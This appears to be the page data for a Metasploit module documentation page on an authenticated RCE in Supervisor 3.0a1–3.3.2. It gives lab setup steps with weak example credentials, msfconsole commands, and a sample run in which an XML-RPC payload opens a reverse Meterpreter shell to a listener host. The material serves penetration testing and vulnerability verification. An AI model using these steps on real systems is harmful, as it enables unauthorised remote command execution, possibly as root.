{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/supervisor_xmlrpc_exec","result":{"data":{"moduleMetadataJson":{"id":"e17b5e2b-7c91-5623-bf2c-ca663090d2d5","name":"Supervisor XML-RPC Authenticated Remote Code Execution","fullname":"exploit/linux/http/supervisor_xmlrpc_exec","description":"This module exploits a vulnerability in the Supervisor process control software, where an authenticated client\n        can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server.\n        The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this\n        may be root. This vulnerability can only be exploited by an authenticated client, or if supervisord has been\n        configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/supervisor_xmlrpc_exec","documentationSlug":"/modules/documentation/exploit/linux/http/supervisor_xmlrpc_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module exploits an authenticated RCE vulnerability in Supervisor versions 3.0a1 to 3.3.2</p>\n<p>  This has been tested with versions 3.2.0 and 3.3.2</p>\n<h3 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h3>\n<p>  At the time of writing, version 3.2.0-2ubuntu0.1 is available in the Ubuntu repositories.</p>\n<ol>\n<li><code class=\"language-text\">sudo apt-get install supervisor</code></li>\n<li>Enable Web interface/XML-RPC server in Supervisor config in <code class=\"language-text\">/etc/supervisor/supervisord.conf</code></li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">```\n[inet_http_server]         ; inet (TCP) server disabled by default\nport=:9001        ; ip_address:port specifier, *:port for all iface\nusername=user              ; default is no username (open server)\npassword=123               ; default is no password (open server)\n```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"3\">\n<li>Restart the service: <code class=\"language-text\">sudo service supervisor restart</code></li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li><code class=\"language-text\">use exploit/linux/http/supervisor_xmlrpc_exec</code></li>\n<li><code class=\"language-text\">set lhost [IP]</code></li>\n<li><code class=\"language-text\">set rhost [IP]</code></li>\n<li><code class=\"language-text\">set httpusername user</code></li>\n<li><code class=\"language-text\">set httppassword 123</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n<li>A meterpreter session should have been opened successfully</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>HttpUsername</strong></p>\n<p>  Username for HTTP basic auth which is set in the conf file(optional)</p>\n<p>  <strong>HttpPassword</strong></p>\n<p>  Password for HTTP basic auth which is set in the conf file(optional)</p>\n<p>  <strong>TARGETURI</strong></p>\n<p>  The path to the XML-RPC endpoint</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"supervisor-320-on-xubuntu-1604\" style=\"position:relative;\"><a href=\"#supervisor-320-on-xubuntu-1604\" aria-label=\"supervisor 320 on xubuntu 1604 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Supervisor 3.2.0 on Xubuntu 16.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/supervisor_xmlrpc_exec \nmsf exploit(supervisor_xmlrpc_exec) &gt; set httpusername user\nhttpusername =&gt; user\nmsf exploit(supervisor_xmlrpc_exec) &gt; set httppassword 123\nhttppassword =&gt; 123\nmsf exploit(supervisor_xmlrpc_exec) &gt; set lhost 192.168.0.2\nlhost =&gt; 192.168.0.2\nmsf exploit(supervisor_xmlrpc_exec) &gt; set rhost 192.168.0.19\nrhost =&gt; 192.168.0.19\nmsf exploit(supervisor_xmlrpc_exec) &gt; check \n\n[*] Extracting version from web interface..\n[*] Using basic auth (user:123)\n[+] Vulnerable version found: 3.2.0\n[*] 192.168.0.19:9001 The target appears to be vulnerable.\nmsf exploit(supervisor_xmlrpc_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 192.168.0.2:4444 \n[*] Sending XML-RPC payload via POST to 192.168.0.19:9001/RPC2\n[*] Using basic auth (user:123)\n[*] Sending stage (2878872 bytes) to 192.168.0.19\n[*] Command Stager progress - 100.00% done (782/782 bytes)\n[+] Request timeout, usually indicates success. Passing to handler..\n[*] Meterpreter session 1 opened (192.168.0.2:4444 -&gt; 192.168.0.19:36186) at 2017-08-30 01:24:45 +0100\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e17b5e2b-7c91-5623-bf2c-ca663090d2d5"}}}